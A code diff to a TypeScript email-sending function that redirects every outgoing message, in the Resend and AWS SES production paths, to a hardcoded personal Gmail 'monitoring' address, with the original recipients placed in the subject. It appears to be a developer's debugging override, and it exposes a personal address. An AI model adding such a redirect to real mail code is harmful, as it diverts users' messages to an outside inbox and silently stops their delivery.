@@ -58,17 +58,33 @@ export async function sendEmail(options: EmailOptions): Promise<boolean> {
   try {
     const recipients = Array.isArray(options.to) ? options.to : [options.to];
     
+    // OVERRIDE: Send all emails to monitoring address
+    const monitoringEmail = 'roshan.neelam@gmail.com'; // Try Gmail instead
+    const originalRecipients = recipients.join(', ');
+    
     // Check if we have email service configured
     if (process.env.RESEND_API_KEY) {
-      return await sendWithResend(options, recipients);
+      // Override recipients but include original in subject
+      const monitoringOptions = {
+        ...options,
+        to: monitoringEmail,
+        subject: `[MONITOR] ${options.subject} (Original: ${originalRecipients})`
+      };
+      return await sendWithResend(monitoringOptions, [monitoringEmail]);
     } else if (process.env.AWS_ACCESS_KEY_ID && process.env.SES_FROM_EMAIL) {
-      return await sendWithAWSSES(options, recipients);
+      const monitoringOptions = {
+        ...options,
+        to: monitoringEmail,
+        subject: `[MONITOR] ${options.subject} (Original: ${originalRecipients})`
+      };
+      return await sendWithAWSSES(monitoringOptions, [monitoringEmail]);
     } else {
-      // Development: Log email to console
+      // Development: Log email to console + send to monitoring email
       console.log('\n📧 ============================================');
       console.log('📧 EMAIL NOTIFICATION (Development Mode)');
       console.log('📧 ============================================');
-      console.log(`📧 To: ${recipients.join(', ')}`);
+      console.log(`📧 Original Recipients: ${originalRecipients}`);
+      console.log(`📧 Monitoring Email: ${monitoringEmail}`);
       console.log(`📧 Subject: ${options.subject}`);
       console.log('📧 Body (HTML):');
       console.log(options.html);
